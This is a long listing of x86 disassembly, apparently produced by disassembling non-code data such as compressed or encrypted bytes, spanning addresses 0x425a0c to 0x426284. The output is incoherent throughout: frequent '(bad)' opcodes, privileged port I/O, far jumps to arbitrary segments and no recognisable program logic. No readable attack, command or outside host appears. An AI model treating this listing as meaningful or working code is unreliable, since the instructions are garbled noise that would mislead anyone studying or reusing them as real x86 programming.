  425a0c:	mov    ebx,0xebf0b6d3
  425a11:	fnclex 
  425a13:	aam    0xf2
  425a15:	bnd ret 
  425a17:	add    eax,eax
  425a19:	vpandn xmm6,xmm7,xmm7
  425a1d:	test   bl,0xe7
  425a20:	fsubr  st,st(3)
  425a22:	int    0xc8
  425a24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a25:	mov    esi,0xc1d0bcf7
  425a2a:	scas   eax,DWORD PTR es:[edi]
  425a2b:	out    dx,eax
  425a2c:	les    edi,FWORD PTR [esi-0x23fd2f01]
  425a32:	mov    esp,0xf8d907e3
  425a37:	(bad)  
  425a38:	stc    
  425a39:	stc    
  425a3a:	rcr    bl,0xf8
  425a3d:	aam    0xda
  425a3f:	fld    DWORD PTR [esp+edi*8]
  425a42:	repz repz ret 
  425a45:	lods   eax,DWORD PTR ds:[esi]
  425a46:	loope  0x425a1f
  425a48:	out    dx,eax
  425a49:	in     al,dx
  425a4a:	mov    dl,0xe9
  425a4c:	(bad)  
  425a4e:	(bad)  
  425a4f:	fnstsw WORD PTR [ebx-0x131e0117]
  425a55:	mov    eax,0x407f6e4
  425a5a:	add    bh,bl
  425a5c:	add    ch,dh
  425a5e:	fsub   st,st(6)
  425a60:	clts   
  425a62:	loopne 0x425a35
  425a64:	xlat   BYTE PTR ds:[ebx]
  425a65:	in     al,dx
  425a66:	int3   
  425a67:	cmc    
  425a68:	mov    ch,0xba
  425a6a:	(bad)  
  425a6b:	fcmovne st,st(3)
  425a6d:	shr    dh,cl
  425a6f:	retf   
  425a70:	in     al,dx
  425a71:	test   cl,0xf4
  425a74:	ret    
  425a75:	in     al,dx
  425a76:	loope  0x425a4e
  425a78:	in     eax,0xdb
  425a7a:	retf   0xddf4
  425a7d:	cld    
  425a7e:	fimul  WORD PTR [ecx]
  425a80:	iret   
  425a81:	retf   0xbeac
  425a84:	jmp    0x425a3c
  425a86:	fdivr  st(4),st
  425a88:	lods   eax,DWORD PTR ds:[esi]
  425a89:	lds    esi,FWORD PTR [esp+edx*8-0x114c0a08]
  425a90:	iret   
  425a91:	sar    ch,cl
  425a93:	mul    edi
  425a95:	(bad)  
  425a97:	mov    esi,0xea03ebbc
  425a9c:	fdivp  st(6),st
  425a9e:	fstp   st(2)
  425aa0:	stc    
  425aa1:	jmp    0xdcd6:0xf1e0a9ed
  425aa8:	loop   0x425a9e
  425aaa:	jmp    0xf5fa5087
  425aaf:	jmp    0xe1d3:0xf9ccc2ff
  425ab6:	add    al,0xc3
  425ab8:	cli    
  425ab9:	ret    
  425aba:	push   es
  425abb:	(bad)  
  425abc:	fucomi st,st(2)
  425abe:	stc    
  425abf:	or     al,0xee
  425ac1:	out    dx,al
  425ac2:	fldcw  WORD PTR [edi+ebp*8-0x2f2d4f49]
  425ac9:	in     al,0xf3
  425acb:	in     eax,0xd1
  425acd:	imul   esp
  425acf:	mov    edx,0xf0d6c8ea
  425ad4:	out    dx,eax
  425ad5:	fstp   TBYTE PTR [ebx-0x352b0b06]
  425adb:	jmp    0x425aa7
  425add:	enter  0xcbdb,0xe9
  425ae1:	(bad)  
  425ae3:	int3   
  425ae4:	imul   DWORD PTR [eax-0x8171b2a]
  425aea:	les    edi,FWORD PTR [edx-0x46083b32]
  425af0:	(bad)  
  425af1:	icebp  
  425af2:	add    ecx,esi
  425af4:	mov    ecx,0xc4d3dee2
  425af9:	pop    es
  425afa:	xlat   BYTE PTR ds:[ebx]
  425afb:	or     esi,edi
  425afd:	push   cs
  425afe:	or     al,0xec
  425b00:	out    0x0,eax
  425b02:	(bad)
  425b05:	fdivr  st(1),st
  425b07:	aam    0xb6
  425b09:	fcmove st,st(5)
  425b0b:	in     eax,0xe9
  425b0d:	jmp    0xe0e1:0xd5dacaf3
  425b14:	add    ecx,eax
  425b16:	in     eax,0xdc
  425b18:	cmc    
  425b19:	fmul   st(2),st
  425b1b:	in     al,0x3
  425b1d:	(bad)  
  425b1e:	loop   0x425b0f
  425b20:	int    0x5
  425b22:	shl    BYTE PTR [edx-0x524e2e10],1
  425b28:	iret   
  425b29:	mov    ch,0xf9
  425b2c:	jmp    0xb2400ff6
  425b31:	jmp    0xbf1318ff
  425b36:	int    0xd7
  425b38:	icebp  
  425b39:	lock or cl,BYTE PTR [edi]
  425b3c:	fimul  DWORD PTR [edx]
  425b3e:	leave  
  425b3f:	fadd   DWORD PTR [edx]
  425b41:	or     ebp,DWORD PTR [eax-0x5422080f]
  425b47:	(bad)  
  425b48:	lods   eax,DWORD PTR ds:[esi]
  425b49:	xlat   BYTE PTR ds:[ebx]
  425b4a:	loopne 0x425b34
  425b4c:	out    0xde,eax
  425b4e:	iret   
  425b4f:	in     al,0xcc
  425b51:	(bad)  
  425b52:	cli    
  425b53:	mov    dh,0xe6
  425b55:	mov    esi,0xe0e700c0
  425b5a:	or     ecx,esp
  425b5c:	out    0xf8,al
  425b5e:	or     eax,0xbcfcdadf
  425b63:	mov    al,0xad
  425b65:	jecxz  0x425b49
  425b67:	retf   0xcacf
  425b6a:	mov    bh,0xd1
  425b6c:	fidiv  DWORD PTR [ebp-0x1d433301]
  425b72:	jmp    0xed1d1449
  425b77:	push   es
  425b78:	fucomi st,st(2)
  425b7a:	fcmovnbe st,st(7)
  425b7c:	push   cs
  425b7d:	enter  0xe2c9,0x3
  425b81:	add    eax,esi
  425b83:	mov    al,0xbc
  425b85:	out    dx,al
  425b86:	iret   
  425b87:	(bad)  
  425b8b:	sti    
  425b8c:	hlt    
  425b8d:	jmp    0xdbe3:0xc8b1ecb7
  425b94:	(bad)  
  425b95:	(bad)  
  425b96:	fdivrp st(7),st
  425b98:	mov    esp,0xa06c7f1
  425b9d:	std    
  425b9e:	call   0xae42486c
  425ba3:	stos   BYTE PTR es:[edi],al
  425ba4:	mov    bh,0xdd
  425ba6:	repz sar BYTE PTR [ebx-0x2a083818],0xb0
  425bae:	std    
  425baf:	out    dx,eax
  425bb0:	retf   0xbcd3
  425bb3:	iret   
  425bb4:	(bad)  
  425bb6:	shl    cl,0xd1
  425bb9:	ror    ecx,0x6
  425bbc:	jmp    0x425bad
  425bbe:	leave  
  425bbf:	(bad)  
  425bc0:	retf   0xb2ce
  425bc3:	icebp  
  425bc4:	loopne 0x425b9d
  425bc6:	aad    0xf2
  425bc8:	lock fnstenv [eax-0x40284648]
  425bcf:	mov    ch,0xd6
  425bd1:	repz ret 
  425bd3:	fistp  QWORD PTR [edi+0xad5fed1]
  425bd9:	retf   0xd6fc
  425bdc:	fcomp  st(4)
  425bde:	(bad)  
  425be0:	enter  0xc3cd,0xe4
  425be4:	(bad)  
  425be5:	lds    esi,FWORD PTR [esi-0x2c4e3d50]
  425beb:	in     al,dx
  425bec:	repz aam 0xdd
  425bef:	xlat   BYTE PTR ds:[ebx]
  425bf0:	(bad)  
  425bf1:	retf   0xffff
  425bf4:	stc    
  425bf5:	mov    eax,0xae3d807
  425bfa:	add    ebp,edi
  425bfc:	add    BYTE PTR [edx],cl
  425bfe:	add    ebx,esp
  425c00:	in     eax,0xda
  425c02:	mov    ecx,0xc7cae2e7
  425c07:	shl    eax,0xd6
  425c0a:	mov    cl,0xe4
  425c0c:	cmc    
  425c0d:	fmul   st,st(5)
  425c0f:	cld    
  425c10:	xlat   BYTE PTR ds:[ebx]
  425c11:	int    0xf1
  425c13:	clc    
  425c14:	mov    DWORD PTR [ecx],0xdef8d8f0
  425c1a:	sti    
  425c1b:	jmp    0xee5026e5
  425c20:	loop   0x425c03
  425c22:	jecxz  0x425bdc
  425c24:	mov    al,0xed
  425c26:	icebp  
  425c27:	lods   eax,DWORD PTR ds:[esi]
  425c28:	mov    ah,0xb1
  425c2a:	rcl    al,1
  425c2c:	(bad)  
  425c2d:	in     al,0xd0
  425c2f:	(bad)  
  425c31:	jecxz  0x425bf4
  425c33:	rcr    bl,1
  425c35:	stc    
  425c36:	in     al,0xfb
  425c38:	(bad)  
  425c3b:	fstp   st(3)
  425c3d:	neg    bl
  425c3f:	in     eax,0xda
  425c41:	int    0xad
  425c43:	in     al,dx
  425c44:	iret   
  425c45:	mov    ebp,0xe8b4bcb3
  425c4a:	into   
  425c4b:	mov    eax,0xf3e9cbb8
  425c50:	fdiv   QWORD PTR [edi+esi*4-0x391c220a]
  425c57:	neg    al
  425c59:	out    0xe0,eax
  425c5b:	lds    eax,FWORD PTR [ecx*1-0x2d253d21]
  425c62:	mov    esp,0xb2eee6e9
  425c67:	shl    ebp,0xef
  425c6a:	jmp    0xd1fb:0xf5f2d1cd
  425c71:	(bad)  
  425c73:	into   
  425c74:	iret   
  425c75:	stc    
  425c76:	fcmovb st,st(4)
  425c78:	cli    
  425c79:	fst    st(1)
  425c7b:	out    0xbd,eax
  425c7d:	retf   
  425c7e:	add    eax,0xafe6fddf
  425c83:	(bad)  
  425c84:	mov    bl,0xb3
  425c86:	shr    ecx,cl
  425c88:	cmc    
  425c89:	not    eax
  425c8b:	clc    
  425c8c:	retf   
  425c8d:	lods   al,BYTE PTR ds:[esi]
  425c8e:	fidivr DWORD PTR [ebp-0x24fe2f37]
  425c94:	int    0xfc
  425c96:	fadd   st(6),st
  425c98:	loope  0x425c94
  425c9a:	(bad)
  425c9d:	fldl2t 
  425c9f:	or     al,0xea
  425ca1:	ror    bh,cl
  425ca3:	jmp    0xd6055387
  425ca8:	vshufpd xmm6,xmm2,xmm4,0xc9
  425cad:	fsubp  st(2),st
  425caf:	fdivr  st(2),st
  425cb1:	add    edx,edx
  425cb3:	shl    cl,0xdc
  425cb6:	lock pop es
  425cb8:	hlt    
  425cb9:	push   es
  425cba:	out    0xdb,al
  425cbc:	not    esi
  425cbe:	or     eax,0xa8e001de
  425cc3:	shl    edi,cl
  425cc5:	icebp  
  425cc6:	ret    0xcbe9
  425cc9:	mov    dh,0xb7
  425ccb:	mov    ebx,0xf2d6c8c9
  425cd0:	sti    
  425cd1:	mov    eax,0xbdb5d2e2
  425cd6:	neg    ah
  425cd8:	loop   0x425cd3
  425cda:	retf   0xe908
  425cdd:	out    dx,eax
  425cde:	add    edi,edi
  425ce0:	add    esi,edi
  425ce2:	stos   DWORD PTR es:[edi],eax
  425ce3:	shl    DWORD PTR [edi-0x2c351a39],cl
  425ce9:	iret   
  425cea:	aad    0xcf
  425cec:	enter  0xfbf1,0xd6
  425cf0:	cli    
  425cf1:	icebp  
  425cf2:	loope  0x425cc1
  425cf4:	loopne 0x425cf9
  425cf6:	fstp   st(4)
  425cf8:	mov    ebp,0xc9fde2f1
  425cfd:	cli    
  425cfe:	jmp    0xec524ae6
  425d03:	fmulp  st(3),st
  425d05:	lds    ebp,FWORD PTR [esi-0x35063905]
  425d0b:	aam    0xe8
  425d0d:	fmulp  st(5),st
  425d0f:	f2xm1  
  425d11:	aam    0xed
  425d13:	shl    dl,0xdb
  425d16:	add    dh,dl
  425d18:	mov    ebp,0xc9def507
  425d1d:	aad    0x2
  425d1f:	out    0xa,eax
  425d21:	stc    
  425d22:	fbstp  TBYTE PTR [ecx-0x3643492d]
  425d28:	imul   BYTE PTR [eax-0x22113a4b]
  425d2e:	shl    dl,1
  425d30:	cmc    
  425d31:	add    dl,bh
  425d33:	sar    bl,cl
  425d35:	repnz (bad) 
  425d38:	(bad)  
  425d3a:	test   DWORD PTR [edx],0xcee0ea07
  425d40:	in     al,0xfe
  425d42:	leave  
  425d43:	call   0xfc054210
  425d48:	test   esp,0xbffbd9eb
  425d4e:	retf   
  425d4f:	ror    cl,cl
  425d51:	stc    
  425d52:	neg    ah
  425d54:	into   
  425d55:	rol    BYTE PTR [ebx],0xc7
  425d58:	aad    0xf7
  425d5a:	out    0x3,al
  425d5c:	pop    es
  425d5d:	(bad)  
  425d5e:	out    dx,al
  425d5f:	in     al,0xfb
  425d61:	or     al,0xd3
  425d63:	rcl    bl,0xcd
  425d66:	div    DWORD PTR [edi-0xc0c090c]
  425d6c:	in     al,dx
  425d6d:	jmp    0x425d62
  425d6f:	mov    ecx,0xf6edd2c3
  425d74:	mov    ch,0xc7
  425d76:	(bad)  
  425d77:	jecxz  0x425d44
  425d79:	lock or dh,dh
  425d7c:	add    BYTE PTR [edi],al
  425d7e:	add    DWORD PTR [edi],eax
  425d80:	push   cs
  425d81:	fldcw  WORD PTR [ecx-0x29502941]
  425d87:	ret    
  425d88:	loopne 0x425d6e
  425d8a:	shl    ah,cl
  425d8c:	hlt    
  425d8d:	cmc    
  425d8e:	mov    ah,0xb9
  425d90:	fmulp  st(7),st
  425d92:	loopne 0x425d61
  425d94:	in     eax,dx
  425d95:	rcr    ebp,1
  425d97:	rcl    bh,1
  425d99:	in     al,0xb
  425d9b:	cld    
  425d9c:	mov    ebp,0xed08c70b
  425da1:	loope  0x425d73
  425da3:	ror    bh,cl
  425da5:	out    dx,al
  425da6:	mov    bl,0xb1
  425da8:	mov    al,0xba
  425daa:	mov    ch,0xd6
  425dac:	jmp    0xf503:0xcdbfb9e9
  425db3:	rcr    bh,cl
  425db5:	push   ebp
  425db7:	(bad)  
  425dba:	(bad)  
  425dbb:	(bad)  
  425dbd:	add    BYTE PTR [edx],al
  425dbf:	push   es
  425dc0:	sti    
  425dc1:	clc    
  425dc2:	loopne 0x425db2
  425dc4:	shl    al,0xe1
  425dc7:	call   0xd42c3793
  425dcc:	out    0xfd,eax
  425dce:	stc    
  425dcf:	in     al,0xfa
  425dd1:	add    ebp,esi
  425dd3:	mov    eax,0xf9e4e6e2
  425dd8:	cli    
  425dd9:	(bad)  [ebx]
  425ddb:	neg    esp
  425ddd:	(bad)  
  425dde:	(bad)
  425de2:	repz into 
  425de4:	loope  0x425dbd
  425de6:	in     eax,dx
  425de7:	in     al,0xb5
  425de9:	vpsadbw xmm3,xmm3,xmm3
  425ded:	iret   
  425dee:	fnstcw WORD PTR [eax-0x18331321]
  425df4:	add    bl,dh
  425df6:	cld    
  425df7:	fild   DWORD PTR [edx]
  425df9:	sar    al,1
  425dfb:	add    ebx,edx
  425dfd:	(bad)  [ebx]
  425dff:	or     ah,ah
  425e01:	repz out 0xcc,al
  425e04:	repz loop 0x425dcd
  425e07:	mov    dl,0xb4
  425e09:	in     eax,dx
  425e0a:	fadd   st,st(5)
  425e0c:	fsubr  st,st(1)
  425e0e:	in     al,0xe4
  425e10:	mov    ecx,0x6d0c803
  425e15:	rol    BYTE PTR ds:0xdd0ae401,0xe5
  425e1c:	out    dx,al
  425e1d:	sti    
  425e1e:	int    0xe8
  425e20:	loopne 0x425e2c
  425e22:	(bad)  
  425e23:	scas   eax,DWORD PTR es:[edi]
  425e24:	icebp  
  425e25:	aad    0xe6
  425e27:	fninit 
  425e29:	repz leave 
  425e2b:	iret   
  425e2c:	lods   eax,DWORD PTR ds:[esi]
  425e2d:	enter  0xe4d8,0xca
  425e31:	std    
  425e32:	stc    
  425e33:	shl    edx,0xe5
  425e36:	cld    
  425e37:	out    0xe5,eax
  425e39:	fxch   st(2)
  425e3b:	aad    0x9
  425e3d:	hlt    
  425e3e:	jecxz  0x425e2f
  425e40:	sti    
  425e41:	loop   0x425e2a
  425e43:	retf   
  425e44:	retf   
  425e45:	lock mov bh,0xcb
  425e48:	loop   0x425e14
  425e4a:	shl    BYTE PTR [ebp-0x3b142a16],cl
  425e50:	jmp    ecx
  425e52:	sar    ebx,cl
  425e54:	(bad)  
  425e55:	mov    ebp,0xf60000be
  425e5a:	sar    esi,0xcb
  425e5d:	(bad)  
  425e5e:	cmc    
  425e5f:	out    0xc9,al
  425e61:	loope  0x425e30
  425e63:	retf   
  425e64:	enter  0xf3ef,0xad
  425e68:	(bad)  
  425e69:	mov    bl,0xc5
  425e6b:	mov    ecx,0xb6f5cfc5
  425e70:	(bad)  
  425e72:	(bad)  
  425e73:	cli    
  425e74:	ret    0x7f0
  425e77:	fild   DWORD PTR [edi]
  425e79:	cld    
  425e7a:	fsub   st,st(0)
  425e7c:	loope  0x425e80
  425e7e:	pmulhw mm2,mm3
  425e81:	jmp    0xc5f2:0xd5e0d0ad
  425e88:	jmp    0xfbdf:0xc9e6d4d4
  425e8f:	enter  0xcfe3,0xe9
  425e93:	in     eax,dx
  425e94:	shl    dh,cl
  425e96:	aad    0xff
  425e98:	add    ecx,edx
  425e9a:	push   es
  425e9b:	ret    0xe7e9
  425e9e:	out    0xe9,eax
  425ea0:	int3   
  425ea1:	retf   
  425ea2:	test   al,0xd2
  425ea4:	mov    dl,0xca
  425ea6:	mov    edi,0xc6f2e8f0
  425eac:	fcomp  st(1)
  425eae:	mov    bl,0xd3
  425eb0:	int    0xf8
  425eb2:	leave  
  425eb3:	mov    edi,0xc4f3d8c2
  425eb8:	shl    dl,0x3
  425ebb:	sar    edi,0xe
  425ebe:	jecxz  0x425eae
  425ec0:	pop    es
  425ec1:	(bad)  
  425ec2:	repnz lods eax,DWORD PTR ds:[esi]
  425ec4:	shl    ch,1
  425ec6:	ffree  st(0)
  425ec8:	shl    eax,0xd8
  425ecb:	mov    eax,0xccebf8d5
  425ed0:	sar    edi,1
  425ed2:	add    DWORD PTR [eax-0xb413109],edi
  425ed8:	mov    ebp,0xf5e7c4dd
  425edd:	out    dx,al
  425ede:	or     eax,0xc3def8dd
  425ee3:	mov    dl,0xd7
  425ee5:	mov    dl,0xb2
  425ee7:	int3   
  425ee8:	test   eax,0xd0d6d8cf
  425eee:	repnz (bad) 
  425ef1:	out    dx,eax
  425ef2:	call   0xc80331d6
  425ef7:	loopne 0x425eea
  425ef9:	jmp    0xc62546e0
  425efe:	hlt    
  425eff:	pop    es
  425f00:	sti    
  425f01:	adc    cl,al
  425f03:	out    dx,eax
  425f04:	lods   eax,DWORD PTR ds:[esi]
  425f05:	shr    dh,cl
  425f07:	rcl    ecx,1
  425f09:	mov    ch,0xb2
  425f0b:	out    0xf7,al
  425f0d:	mov    al,0xb4
  425f0f:	enter  0xe1d2,0x3
  425f13:	icebp  
  425f14:	(bad)  
  425f15:	cmc    
  425f16:	xlat   BYTE PTR ds:[ebx]
  425f17:	cmc    
  425f18:	(bad)  
  425f19:	ret    0x6c2
  425f1c:	or     edi,esi
  425f1e:	hlt    
  425f1f:	std    
  425f20:	or     eax,0xcaaec203
  425f25:	lds    edi,FWORD PTR [ecx+ebp*8-0x2c11162f]
  425f2c:	xlat   BYTE PTR ds:[ebx]
  425f2d:	in     eax,0xb4
  425f2f:	mov    edi,0xffd1f1ee
  425f34:	fucom  st(7)
  425f36:	sar    cl,1
  425f38:	mov    ecx,0xe4dddfe4
  425f3d:	enter  0xf90b,0x5
  425f41:	iret   
  425f42:	test   al,0xf3
  425f44:	ror    edx,1
  425f46:	fsubr  QWORD PTR [edx-0x312d2a37]
  425f4c:	in     al,dx
  425f4d:	stc    
  425f4e:	shl    ch,1
  425f50:	fdivr  st(1),st
  425f52:	mov    eax,0xc1c1b8ee
  425f57:	(bad)  
  425f58:	fstp   st(7)
  425f5a:	jmp    0xa4c3a1d
  425f5f:	(bad)  
  425f60:	loopne 0x425f3f
  425f62:	fsubr  DWORD PTR [edx-0x14152254]
  425f68:	ret    0xebd5
  425f6b:	enter  0xb6f7,0xdb
  425f6f:	aam    0xd9
  425f71:	jecxz  0x425f40
  425f73:	mov    dh,0xdf
  425f75:	into   
  425f76:	in     eax,dx
  425f77:	fild   WORD PTR [ecx]
  425f79:	stc    
  425f7a:	cli    
  425f7b:	shr    bh,0xdf
  425f7e:	inc    edx
  425f80:	ror    esp,cl
  425f82:	fistp  QWORD PTR [edi-0x36373709]
  425f88:	(bad)  
  425f89:	into   
  425f8a:	mov    ch,0xef
  425f8c:	in     eax,0xec
  425f8e:	mov    ch,0xcc
  425f90:	fdivr  st(0),st
  425f92:	add    ch,bh
  425f94:	sar    bh,0x7
  425f97:	icebp  
  425f98:	fcomp  st(6)
  425f9a:	fdiv   st,st(6)
  425f9c:	ror    bh,0xf5
  425f9f:	fiadd  DWORD PTR [ebx]
  425fa1:	ror    bh,cl
  425fa3:	shr    edi,0xbc
  425fa6:	loopne 0x425f5d
  425fa8:	in     al,0xe5
  425faa:	stc    
  425fab:	mov    dl,0xfb
  425fad:	repz mov edx,0xd8d3bad5
  425fb3:	icebp  
  425fb4:	(bad)  
  425fb5:	push   es
  425fb6:	fild   WORD PTR [edi]
  425fb8:	fchs   
  425fba:	push   es
  425fbb:	(bad)  
  425fbc:	fcmovu st,st(5)
  425fbe:	sti    
  425fbf:	or     al,0xd9
  425fc1:	or     al,0xc8
  425fc3:	loope  0x425f87
  425fc5:	loopne 0x425f78
  425fc7:	ret    0xb1fb
  425fca:	cmc    
  425fcb:	test   ebp,0xf2bddcb0
  425fd1:	(bad)  
  425fd2:	(bad)  
  425fd4:	out    0x3,eax
  425fd6:	loopne 0x425fcc
  425fd8:	out    0xd8,eax
  425fda:	cld    
  425fdb:	retf   
  425fdc:	ror    esi,0xc3
  425fdf:	add    eax,0xcbecedcd
  425fe4:	rol    ah,1
  425fe6:	div    BYTE PTR [edi-0x444f1138]
  425fec:	mov    edi,0xeddde8d6
  425ff1:	jmp    0xdbd5:0x3ecfef9
  425ff8:	fcos   
  425ffa:	fdivp  st(7),st
  425ffc:	out    0xfc,eax
  425ffe:	(bad)  
  425fff:	in     al,0xc5
  426001:	stc    
  426002:	mov    esi,0xddd2b7c9
  426007:	int    0xf3
  426009:	in     al,0xe8
  42600b:	mov    dh,0xe8
  42600d:	int3   
  42600e:	out    dx,eax
  42600f:	jmp    0xc1205d01
  426014:	repz jecxz 0x425fee
  426017:	in     al,dx
  426018:	out    0xea,al
  42601a:	push   es
  42601b:	in     al,0x3
  42601d:	retf   
  42601e:	add    al,ch
  426020:	out    0xfe,eax
  426022:	in     al,dx
  426023:	call   0xd2264818
  426028:	out    0xda,eax
  42602a:	call   0xf3094014
  42602f:	mov    esp,0xd801f4
  426034:	(bad)  
  426036:	sar    BYTE PTR [esi-0x51a161e],1
  42603c:	call   0x141c2625
  426041:	(bad)  
  426042:	(bad)  
  426044:	scas   al,BYTE PTR es:[edi]
  426045:	test   al,0xf0
  426047:	lock shl edx,1
  42604a:	in     eax,dx
  42604b:	(bad)  
  42604c:	fxch   st(0)
  42604e:	fdivr  QWORD PTR [edx-0x2b0a0f22]
  426054:	repz loope 0x426043
  426057:	rcr    cl,1
  426059:	ret    
  42605a:	cld    
  42605b:	ret    0xc801
  42605e:	loope  0x42603e
  426060:	iret   
  426061:	or     bl,cl
  426063:	ret    
  426064:	scas   al,BYTE PTR es:[edi]
  426065:	test   ebp,0xd2fab4c9
  42606b:	(bad)  
  42606c:	fmul   st,st(7)
  42606e:	cmc    
  42606f:	in     al,dx
  426070:	fcomip st,st(5)
  426072:	cmc    
  426073:	repz mov edi,0xf6d5f600
  426079:	hlt    
  42607a:	or     dl,al
  42607c:	call   0xc61a7056
  426081:	(bad)  
  426083:	out    dx,eax
  426084:	shl    edi,cl
  426086:	out    0xec,al
  426088:	mov    bh,0xd2
  42608a:	mov    edx,0xe9fed5b9
  42608f:	hlt    
  426090:	shr    dh,cl
  426092:	loopne 0x426082
  426094:	loopne 0x426055
  426096:	mov    BYTE PTR ds:0xc2f90bd5,0xf5
  42609d:	add    ch,cl
  42609f:	fnsetpm(287 only) 
  4260a1:	or     BYTE PTR [ebx-0x2b0f3031],dh
  4260a7:	lods   eax,DWORD PTR ds:[esi]
  4260a8:	lods   al,BYTE PTR ds:[esi]
  4260a9:	in     eax,dx
  4260aa:	in     eax,0xc0
  4260ac:	fcmove st,st(0)
  4260ae:	cld    
  4260af:	jecxz  0x426089
  4260b1:	fst    st(1)
  4260b3:	hlt    
  4260b4:	cli    
  4260b5:	out    0xcc,al
  4260b7:	std    
  4260b8:	fcmovbe st,st(7)
  4260ba:	out    0x4,al
  4260bc:	add    dh,ah
  4260be:	pop    es
  4260bf:	repz sar edx,cl
  4260c2:	ret    0xb3c4
  4260c5:	cmc    
  4260c6:	scas   al,BYTE PTR es:[edi]
  4260c7:	in     eax,0xec
  4260c9:	mov    ah,0xd0
  4260cb:	int3   
  4260cc:	mov    eax,0xd6d3cae6
  4260d1:	retf   0xc302
  4260d4:	fdiv   st(7),st
  4260d6:	fdivr  st,st(5)
  4260d8:	ret    
  4260d9:	lock retf 0xc7d0
  4260dd:	add    ah,dl
  4260df:	fcomp  st(1)
  4260e1:	adc    edi,DWORD PTR [ecx-0x521a3442]
  4260e7:	retf   0xa8b4
  4260ea:	in     eax,0xed
  4260ec:	repz out 0xba,al
  4260ef:	jmp    0xc03154f0
  4260f4:	test   esi,0xf4f6bee7
  4260fa:	fimul  DWORD PTR [edi]
  4260fc:	add    eax,0xf8fa0ccb
  426101:	in     eax,0xe9
  426103:	repz iret 
  426105:	(bad)
  426108:	int3   
  426109:	mov    ah,0xb2
  42610b:	mov    eax,0xf0dbd6c4
  426110:	iret   
  426111:	cmc    
  426112:	sar    edi,1
  426114:	loopne 0x426103
  426116:	(bad)  
  426118:	ror    BYTE PTR [ecx],cl
  42611a:	add    edx,esp
  42611c:	(bad)  
  42611e:	push   es
  42611f:	(bad)  
  426121:	loope  0x4260ca
  426123:	rol    al,cl
  426125:	ffree  st(0)
  426127:	aam    0xb5
  426129:	xlat   BYTE PTR ds:[ebx]
  42612a:	(bad)  
  42612b:	(bad)  
  42612c:	div    al
  42612e:	jmp    0xffcf:0xd6dfc8f0
  426135:	loopne 0x42613e
  426137:	loop   0x42611d
  426139:	or     esi,edx
  42613b:	hlt    
  42613c:	xlat   BYTE PTR ds:[ebx]
  42613d:	(bad)  
  42613f:	fdivp  st(7),st
  426141:	or     esp,ebx
  426143:	rcl    al,1
  426145:	fdivr  st(2),st
  426147:	out    dx,al
  426148:	in     al,dx
  426149:	icebp  
  42614a:	int    0xc0
  42614c:	mov    ah,0xdf
  42614e:	fdivrp st(1),st
  426150:	push   esi
  426152:	repz mov esi,0xe3c0d5c2
  426158:	jmp    0xdb0e:0xc403e3f6
  42615f:	fmul   st(3),st
  426161:	out    dx,eax
  426162:	enter  0xe6e5,0xed
  426166:	jecxz  0x426155
  426168:	repnz icebp 
  42616a:	shl    al,0xff
  42616d:	jmp    0x42616c
  42616f:	repnz aam 0xd1
  426172:	not    bh
  426174:	pop    es
  426175:	rcl    bl,cl
  426177:	repz ror dl,cl
  42617a:	add    esp,ecx
  42617c:	(bad)  
  42617e:	loope  0x426163
  426180:	loop   0x426150
  426182:	repz in al,dx
  426184:	iret   
  426185:	retf   
  426186:	mov    dl,0xea
  426188:	(bad)  
  426189:	xlat   BYTE PTR ds:[ebx]
  42618a:	int    0xfb
  42618c:	repz cmc 
  42618e:	repnz aad 0xf8
  426191:	leave  
  426192:	mov    edi,0xe0e5c7f0
  426197:	fnstsw ax
  426199:	rcl    ah,1
  42619b:	leave  
  42619c:	pop    es
  42619d:	retf   0xf4de
  4261a0:	enter  0xe9ec,0xec
  4261a4:	(bad)  
  4261a6:	loope  0x42615b
  4261a8:	rcl    ebx,cl
  4261aa:	f2xm1  
  4261ac:	mov    edx,0xbbe3f7b5
  4261b1:	sti    
  4261b2:	jecxz  0x426175
  4261b4:	ret    
  4261b5:	std    
  4261b6:	(bad)
  4261b9:	jmp    0xd9205883
  4261be:	mov    edx,0xc2afc0fd
  4261c4:	xlat   BYTE PTR ds:[ebx]
  4261c5:	cmc    
  4261c6:	(bad)  
  4261c7:	div    bh
  4261c9:	retf   
  4261ca:	repz hlt 
  4261cc:	mov    ch,0xd3
  4261ce:	enter  0xc3fe,0xda
  4261d2:	mov    esi,0x2edd2b8
  4261d7:	in     eax,0xd6
  4261d9:	fild   DWORD PTR [edx]
  4261db:	ret    0x3ee
  4261de:	jmp    0xc4e2:0xc201dbd8
  4261e5:	repz (bad) 
  4261e8:	out    0xe2,eax
  4261ea:	mov    cl,0xfa
  4261ec:	mov    edx,0xedbec8d4
  4261f1:	cli    
  4261f2:	add    ecx,esi
  4261f4:	fild   WORD PTR [ecx]
  4261f6:	hlt    
  4261f7:	fsubp  st(2),st
  4261f9:	retf   
  4261fa:	(bad)  
  4261fc:	fcom   st(6)
  4261fe:	out    dx,al
  4261ff:	out    dx,eax
  426200:	stc    
  426201:	or     DWORD PTR [edx-0x4d142023],esi
  426207:	ret    
  426208:	rol    esp,0xf2
  42620b:	mov    ebx,0xbfc5bad1
  426210:	in     eax,dx
  426211:	leave  
  426212:	enter  0xbcc0,0xfc
  426216:	jecxz  0x4261ea
  426218:	(bad)  
  426219:	loop   0x4261ec
  42621b:	loop   0x4261e5
  42621d:	sti    
  42621e:	out    dx,al
  42621f:	fld    st(1)
  426221:	in     al,dx
  426222:	mov    esp,0xb6f0b2c7
  426227:	int    0xda
  426229:	enter  0xd1d5,0xc6
  42622d:	enter  0xc4c4,0xd4
  426231:	sar    ecx,1
  426233:	call   0xf71d2039
  426238:	rol    DWORD PTR [ecx],cl
  42623a:	stc    
  42623b:	call   0xfc4f5127
  426240:	int    0x8
  426242:	int    0xb1
  426244:	loope  0x426217
  426246:	out    dx,al
  426247:	icebp  
  426248:	fcomi  st,st(6)
  42624a:	retf   
  42624b:	xlat   BYTE PTR ds:[ebx]
  42624c:	out    dx,eax
  42624d:	sar    DWORD PTR [edx-0x420c4a4e],cl
  426253:	repnz lock fld DWORD PTR [ecx]
  426257:	add    ecx,DWORD PTR [ebx]
  426259:	loope  0x426224
  42625b:	or     ebx,eax
  42625d:	out    dx,al
  42625e:	retf   
  42625f:	in     eax,0xfc
  426261:	or     ebp,DWORD PTR [ecx-0x163d2c5a]
  426267:	enter  0xb0da,0xec
  42626b:	out    0xdf,eax
  42626d:	mov    ecx,0xddffbfeb
  426272:	add    edi,DWORD PTR [edx-0x230b2411]
  426278:	shl    bh,0xeb
  42627b:	enter  0xeff8,0xd4
  42627f:	fprem  
  426281:	(bad)  
  426282:	in     eax,0xe5
  426284:	fdivr  st(2),st
